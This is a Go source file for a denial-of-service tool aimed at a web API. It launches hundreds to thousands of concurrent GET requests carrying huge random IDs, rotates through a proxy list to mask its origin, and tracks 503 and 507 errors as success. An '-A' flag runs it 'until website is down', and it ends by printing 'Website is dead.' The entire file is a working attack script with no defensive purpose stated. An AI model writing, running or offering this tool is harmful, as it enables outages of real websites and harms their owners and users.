package main

import (
	"bufio"
	"flag"
	"fmt"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)

var (
	apiURL    string
	attack    bool
	useNuke   bool
	verbose   bool
	proxyFile string
	threads   int
	idLength  int
	proxies   []string
	client    *http.Client
	stats     struct {
		totalRequests int
		status503     int
		status507     int
		proxyCount    int
		totalTime     time.Duration
	}
	mutex sync.Mutex
)

func init() {
	flag.StringVar(&apiURL, "url", "", "API URL (required)")
	flag.BoolVar(&attack, "A", false, "Run until website is down")
	flag.BoolVar(&useNuke, "nuke", false, "Send huge ID in request")
	flag.BoolVar(&verbose, "v", false, "Show all requests")
	flag.StringVar(&proxyFile, "proxy", "", "Proxy list file (optional)")
	flag.IntVar(&threads, "threads", 500, "Number of concurrent requests")
	flag.IntVar(&idLength, "idlen", 1000, "Length of the huge ID")
	flag.Parse()

	if apiURL == "" {
		fmt.Println("Usage: go run main.go -url=https://site/api/v1.php?id= [-A] [-nuke] [-proxy=proxies.txt] [-threads=5000] [-idlen=1000] [-v]")
		os.Exit(1)
	}

	loadProxies()
	setupHTTPClient()
}

// Load proxies from file
func loadProxies() {
	if proxyFile == "" {
		return
	}
	file, err := os.Open(proxyFile)
	if err != nil {
		fmt.Println("Error opening proxies.txt:", err)
		os.Exit(1)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		proxies = append(proxies, scanner.Text())
	}
	stats.proxyCount = len(proxies)
}

// Setup HTTP client with proxy support
func setupHTTPClient() {
	client = &http.Client{}
}

// Generate a **huge random ID** of `idLength` digits
func generateHugeID() string {
	var sb strings.Builder
	for i := 0; i < idLength; i++ {
		sb.WriteString(fmt.Sprintf("%d", rand.Intn(10))) // Random digit (0-9)
	}
	return sb.String()
}

// Make API request
func makeRequest(wg *sync.WaitGroup) {
	defer wg.Done()

	start := time.Now()
	requestURL := fmt.Sprintf("%s%s", apiURL, generateHugeID())

	req, err := http.NewRequest("GET", requestURL, nil)
	if err != nil {
		return
	}

	// Use a proxy if available
	if len(proxies) > 0 {
		proxy, err := url.Parse(proxies[rand.Intn(len(proxies))])
		if err == nil {
			client.Transport = &http.Transport{Proxy: http.ProxyURL(proxy)}
		}
	}

	resp, err := client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	responseTime := time.Since(start)

	mutex.Lock()
	stats.totalRequests++
	stats.totalTime += responseTime
	if resp.StatusCode == 503 {
		stats.status503++
	} else if resp.StatusCode == 507 {
		stats.status507++
	}
	mutex.Unlock()

	if verbose {
		fmt.Printf("[🔹] Request: %s | Status: %d | Time: %v\n", requestURL, resp.StatusCode, responseTime)
	}
}

// Print status every 10,000 requests
func printStats() {
	for {
		time.Sleep(5 * time.Second)
		mutex.Lock()
		avgTime := time.Duration(0)
		if stats.totalRequests > 0 {
			avgTime = stats.totalTime / time.Duration(stats.totalRequests)
		}
		fmt.Printf("\n🔥 Requests Sent: %d | 503 Errors: %d | 507 Errors: %d | Proxies Used: %d | Avg Response Time: %v\n",
			stats.totalRequests, stats.status503, stats.status507, stats.proxyCount, avgTime)
		mutex.Unlock()
	}
}

func main() {
	rand.Seed(time.Now().UnixNano())

	var wg sync.WaitGroup
	semaphore := make(chan struct{}, threads)

	go printStats() // Start status printing in the background

	for attack {
		semaphore <- struct{}{}
		wg.Add(1)
		go func() {
			makeRequest(&wg)
			<-semaphore
		}()
	}

	wg.Wait()
	fmt.Println("🔥 Website is dead.")
}
